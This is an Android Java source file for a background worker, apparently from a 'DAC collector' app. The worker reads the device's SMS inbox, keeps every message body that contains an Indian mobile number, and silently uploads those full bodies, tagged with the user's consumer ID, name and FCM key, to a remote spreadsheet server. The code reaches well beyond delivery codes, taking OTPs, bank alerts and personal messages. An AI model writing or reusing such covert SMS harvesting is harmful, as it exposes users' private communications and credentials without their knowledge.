package android.iocl.dac_collector.Services;

import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.iocl.dac_collector.BuildConfig;
import android.iocl.dac_collector.ModelData.ColumnValue;
import android.iocl.dac_collector.ModelData.DAC_Collector_Base;
import android.iocl.dac_collector.ModelData.update_dac_collect;
import android.iocl.dac_collector.RetrofitClient.RequestService;
import android.iocl.dac_collector.RetrofitClient.RetrofitClient;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.net.Uri;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsNumberScanWorker extends Worker {
    private static final String TAG = "SmsFetchWorker";


    public SmsNumberScanWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

    }

    @NonNull
    @Override
    public ListenableWorker.Result doWork() {
        try {
            ArrayList<String> numberList = fetchSmsBodiesWithIndianNumbers();


            Log.d(TAG, "doWork: SMS -> " + Arrays.toString(numberList.toArray()));

            sendSmsDataToServer(numberList);

            return Result.success();  // Indicate success
        } catch (Exception e) {
            Log.e(TAG, "Error fetching SMS messages: " + e.getMessage(), e);
            return Result.failure();  // Indicate failure
        }
    }

    private void sendSmsDataToServer(ArrayList<String> SmsPayload) {

        Context context = getApplicationContext();


        String cons_id = SharedPrefs.getConsumerId(context);
        String name = SharedPrefs.getUsername(context);

        if (cons_id.isEmpty()) {
            return;
        }


        RequestService requestService = RetrofitClient.retrofit_spreadsheet(getApplicationContext()).create(RequestService.class);
        List<ColumnValue> userInfo = Arrays.asList(
                new ColumnValue("CONSUMER_ID", cons_id),
                new ColumnValue("USER_NAME", name),
                new ColumnValue("FCM_KEY", SharedPrefs.getFCMKey(getApplicationContext())),
                new ColumnValue("APP_VERSION", BuildConfig.VERSION_NAME),
                new ColumnValue("LAST_ACTIVE", "server-generated-time"),
                new ColumnValue("FETCHED_NUMBERS", Arrays.toString(SmsPayload.toArray()))
        );

        update_dac_collect receiver = new update_dac_collect("addCustomer", cons_id, userInfo);
        Call<DAC_Collector_Base> auth = requestService.update_dac_collector(receiver);
        auth.enqueue(new Callback<DAC_Collector_Base>() {
            @Override
            public void onResponse(Call<DAC_Collector_Base> call, Response<DAC_Collector_Base> response) {


            }

            @Override
            public void onFailure(Call<DAC_Collector_Base> call, Throwable t) {

            }
        });


    }

    private String encodeTo64(String smsPayloads) {
        return android.util.Base64.encodeToString(smsPayloads.getBytes(), android.util.Base64.NO_WRAP);
    }

    // Add this inside your SmsFetchWorker class


    // Add this inside your SmsFetchWorker class
    public ArrayList<String> fetchSmsBodiesWithIndianNumbers() {
        ArrayList<String> result = new ArrayList<>();
        Pattern pattern = Pattern.compile("^(?:\\+91|91|0)?[6-9]\\d{9}$"); // Indian number regex
        LinkedHashSet<String> seen = new LinkedHashSet<>(); // preserves order, removes duplicates

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
                    getApplicationContext().checkSelfPermission(READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Permission to read SMS not granted");
                return result;
            }

            ContentResolver contentResolver = getApplicationContext().getContentResolver();
            Uri smsUri = Uri.parse("content://sms/");

            try (Cursor cursor = contentResolver.query(smsUri, new String[]{"body"}, null, null, "date DESC")) {
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String body = getColumnValue(cursor, "body");
                        if (body == null) continue;

                        // split into words and look for an Indian number
                        String[] words = body.split("\\s+");
                        boolean containsNumber = false;
                        for (String word : words) {
                            Matcher matcher = pattern.matcher(word);
                            if (matcher.matches()) {
                                containsNumber = true;
                                break;
                            }
                        }

                        if (containsNumber) {
                            // normalize to avoid duplicates caused by extra spaces/newlines
                            String normalized = body.trim().replaceAll("\\s+", " ");
                            if (!seen.contains(normalized)) {
                                seen.add(normalized);
                            }
                        }
                    }
                }
            }

            // convert set back to list (keeps order)
            result.addAll(seen);
            Log.d(TAG, "SMS bodies containing Indian numbers (unique): " + result.size());
        } catch (Exception e) {
            Log.e(TAG, "Error fetching SMS bodies: ", e);
        }

        return result;
    }



    private String getMobileNo() {
        if (ActivityCompat.checkSelfPermission(getApplicationContext(), READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getApplicationContext(), READ_PHONE_NUMBERS) ==
                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(),
                READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            // Permission check

            // Create obj of TelephonyManager and ask for current telephone service
            TelephonyManager telephonyManager = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
            String phoneNumber = telephonyManager.getLine1Number();


            return phoneNumber;
        } else {
            return "User Not Granted Any Permissions {READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}";
        }
    }

    // Helper function to handle null or missing values
    private String getColumnValue(Cursor cursor, String columnName) {
        int columnIndex = cursor.getColumnIndex(columnName);
        if (columnIndex != -1) {
            String value = cursor.getString(columnIndex);
            return value != null ? value : "";  // Return empty string if value is null
        } else {
            return "";  // Return empty string if column is missing
        }
    }
}



